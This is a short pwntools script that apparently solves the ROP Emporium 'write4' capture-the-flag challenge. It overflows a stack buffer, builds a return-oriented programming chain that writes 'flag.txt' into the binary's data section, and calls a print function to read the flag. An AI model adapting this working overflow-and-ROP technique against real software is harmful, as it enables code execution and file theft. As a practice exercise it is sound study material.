from pwn import *

elf = context.binary = ELF("./write4")
rop = ROP(elf)

POP_R14_R15 = p64(rop.r14.address)
MOV_R14_R15 = p64(0x0000000000400628)
POP_RDI     = p64(rop.rdi.address)

a_print_file = p64(elf.symbols["usefulFunction"] + 9)
a_data = p64(0x601028)

payload = b"A" * 0x28
payload += POP_R14_R15
payload += a_data
payload += b"flag.txt"
payload += MOV_R14_R15
payload += POP_RDI
payload += a_data
payload += a_print_file

p = process(elf.path)
p.sendline(payload)
p.interactive()
